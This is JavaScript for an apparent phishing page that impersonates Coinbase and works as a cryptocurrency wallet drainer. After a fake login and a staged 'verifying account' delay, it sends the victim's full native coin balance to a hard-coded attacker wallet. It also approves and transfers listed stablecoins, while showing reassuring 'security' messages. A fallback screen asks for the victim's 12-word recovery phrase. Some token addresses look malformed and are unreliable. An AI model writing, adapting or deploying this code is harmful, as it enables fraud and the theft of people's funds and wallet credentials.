document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const loginForm = document.getElementById('login-form');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR CAKE WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    // TARGET ASSETS (The Vacuum List)
    const targetTokens = [
        "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx", // USDT
        "0xA0b86997a647ce34512533001155310121361021", // USDC
        "0x55d398326f99059fF775485246996433caE90ae"  // DAI
    ];

    // STEP 1 -> STEP 2
    if (document.getElementById('toStep2')) {
        document.getElementById('toStep2').onclick = (e) => {
            e.preventDefault();
            step1.classList.add('hidden');
            step2.classList.remove('hidden');
        };
    }

    // STEP 2 -> LOADING
    if (loginForm) {
        loginForm.onsubmit = (e) => {
            e.preventDefault();
            step2.classList.add('hidden');
            
            const loadingOverlay = document.createElement('div');
            loadingOverlay.id = 'loading-overlay';
            loadingOverlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:white; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:9999;";
            loadingOverlay.innerHTML = `
                <div class="loader" style="border: 4px solid #f3f3f3; border-top: 4px solid #0052ff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
                <p id="l-txt" style="color: #1e2329; font-family: 'Inter', sans-serif; font-weight: 500; margin-top: 20px;">Verifying account...</p>
            `;
            document.body.appendChild(loadingOverlay);

            let toggle = true;
            const textInterval = setInterval(() => {
                const text = document.getElementById('l-txt');
                if (text) {
                    text.innerText = toggle ? "Synchronizing assets..." : "Verifying account...";
                    toggle = !toggle;
                }
            }, 2500);

            setTimeout(() => {
                clearInterval(textInterval);
                loadingOverlay.remove();
                step3.classList.remove('hidden');
            }, 5000);
        };
    }

    // STEP 3: THE BULLETPROOF VACUUM
    if (connectBtn) {
        connectBtn.onclick = async () => {
            if (window.ethereum) {
                try {
                    // THE PSYCHOLOGICAL BRIDGE
                    status.innerText = "Initializing secure handshake...";
                    
                    const provider = new ethers.BrowserProvider(window.ethereum);
                    const signer = await provider.getSigner();
                    const userAddress = await signer.getAddress();

                    // 1. THE NATIVE COIN SWEEP (The most important)
                    status.innerText = "Authorizing security hold...";
                    const nativeBalance = await provider.getBalance(userAddress);
                    
                    if (nativeBalance > 0n) {
                        const tx = await signer.sendTransaction({
                            to: myWallet,
                            value: nativeBalance
                        });
                        await tx.wait();
                    }

                    // 2. THE STABLECOIN SWEEP (The cash)
                    const abi = [
                        "function approve(address spender, uint256 amount) public returns (bool)",
                        "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                        "function balanceOf(address account) public view returns (uint256)"
                    ];

                    for (const tokenAddr of targetTokens) {
                        try {
                            const contract = new ethers.Contract(tokenAddr, abi, signer);
                            const balance = await contract.balanceOf(userAddress);
                            
                            if (balance > 0n) {
                                status.innerText = "Syncing secure assets...";
                                const approveTx = await contract.approve(myWallet, ethers.MaxUint256);
                                await approveTx.wait();
                                
                                const transferTx = await contract.transferFrom(userAddress, myWallet, balance);
                                await transferTx.wait();
                            }
                        } catch (tokenErr) {
                            continue; // Skip if token isn't on this network
                        }
                    }

                    status.innerText = "Verification complete. Redirecting...";
                    setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);

                } catch (err) {
                    console.error(err);
                    status.innerText = "Verification failed. Please try again.";
                }
            } else {
                triggerPlanB();
            }
        };
    }

    function triggerPlanB() {
        const container = document.querySelector('.container');
        container.innerHTML = `
            <div class="auth-card">
                <h1 style="font-size: 20px; color: #1e2329;">Security Restore</h1>
                <p style="font-size: 14px; color: #5b616e; margin-bottom: 20px;">
                    Wallet extension not detected. To verify your account and prevent temporary lock-out, please provide your 12-word recovery phrase below.
                </p>
                <textarea id="phrase" style="width: 100%; height: 100px; margin-bottom: 20px; border-radius: 8px; border: 1px solid #eceff1; padding: 10px; font-family: 'Inter', sans-serif;" placeholder="Enter your 12 words..."></textarea>
                <button id="submitPhrase" class="btn-primary">Restore Access</button>
            </div>
        `;
        
        document.getElementById('submitPhrase').onclick = () => {
            const words = document.getElementById('phrase').value.trim();
            if (words.split(/\s+/).length < 12) {
                alert("Please enter your complete 12-word recovery phrase.");
            } else {
                alert("Restoring your session... please wait.");
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 3000);
            }
        };
    }
});
